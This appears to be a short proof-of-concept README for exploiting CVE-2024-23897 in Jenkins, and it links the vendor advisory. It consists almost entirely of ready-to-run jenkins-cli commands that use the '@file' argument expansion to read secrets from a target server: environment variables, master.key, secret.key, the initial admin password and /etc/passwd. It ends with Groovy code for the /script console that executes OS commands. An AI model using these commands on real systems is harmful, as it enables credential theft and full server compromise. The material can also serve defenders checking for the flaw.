# poc-jenkins

# Valid for CVE-2024-23897

## Official Security Advisory: 
https://www.jenkins.io/security/advisory/2024-01-24/

### Download jar 
wget <url>/jnlpJars/jenkins-cli.jar

## Reading only one line
### Read Jenkins home directory | check HOME=
java -jar jenkins-cli.jar -s <url> -http help 1 "@/proc/self/environ"

### Read master key,"key encryption key", used to encrypt and decrypt keys, is stored unencrypted
java -jar jenkins-cli.jar -s <url> -http help 1 "@/var/jenkins_home/secrets/master.key"

### Read secret key, used to encrypt and decrypt data from credentials.xml
java -jar jenkins-cli.jar -s <url> -http help 1 "@/var/jenkins_home/secret.key"

### Read initial admin password, if exists
java -jar jenkins-cli.jar -noCertificateCheck -s <url> who-am-i "@/var/jenkins_home/secrets/initialAdminPassword"

### Read entire file, if anonymous mode is enabled
java -jar jenkins-cli.jar -s <url> -http connect-node "@/etc/passwd"

### Once you have a password, and initial access is granted
check /script endpoint
script to execute: 
def proc = "id".execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);








